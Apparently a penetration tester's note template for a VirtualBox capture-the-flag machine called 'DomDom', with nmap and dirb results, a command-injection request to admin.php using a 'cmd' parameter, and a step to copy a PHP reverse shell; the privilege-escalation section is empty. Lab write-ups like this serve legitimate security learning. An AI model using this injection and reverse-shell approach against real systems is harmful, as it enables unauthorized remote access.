

---

**S1REN's Template Reference**

\[OS]: Ubuntu
\[Web-Technology]:  http://192.168.100.7:80
\[Hostname]:  
\[IP]:  192.168.100.7
\[USERS]:   
\[CREDENTIALS]:  

---

User form - 

Fuzzing


---
\[NMAP RESULTS]:  
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: DomDom
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 08:00:27:8F:4A:D5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16


--- 

\[Web Services Enumeration]:   

\[To-Try LIST]:  

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: DomDom
|_http-server-header: Apache/2.4.18 (Ubuntu)

|     Path: http://192.168.100.7:80/
|     Form id: user_form
|_    Form action: index.php
| http-enum: 
|_  /admin.php: Possible admin folder

Nothing at 

Dirb:
/server-status
/admin.php


SQLi - no results
Fuzzing no results
Brute forcing?
Code Eval/Injection - ACE?

Burpsuite
![[Pasted image 20250829104104.png]]

forward admin.php -> command executed
![[Pasted image 20250829104511.png]]

try execute id `name=admin&username=admin&password=admin&access=access&cmd=id`
![[Pasted image 20250829104706.png]]


code was executed. Now run reverse shell (w/ machine IP)
`cp /usr/share/webshells/php/php-reverse-shell.php .`






---


\[OTHER / PRIVILEGE-ESCALATION]:   

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
